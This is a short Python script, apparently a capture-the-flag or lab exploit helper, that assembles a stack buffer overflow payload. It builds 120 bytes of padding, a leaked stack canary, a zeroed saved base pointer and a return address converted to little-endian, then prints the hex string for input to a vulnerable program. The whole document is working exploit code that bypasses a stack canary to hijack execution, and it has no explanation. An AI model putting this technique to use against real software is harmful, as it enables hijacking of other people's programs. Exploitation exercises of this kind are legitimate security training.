buf = "41" * 120
canary = "00b7fb4c65d9fc08"
rbp = "00" * 8
address = "0000558da6bfa2e9"
rip = ""
for i in range(len(address) // 2):
    rip = rip + address[len(address) - (2 * i) - 2] + address[len(address) - (2 * i) - 1]

print("str " + buf + canary + rbp + rip)
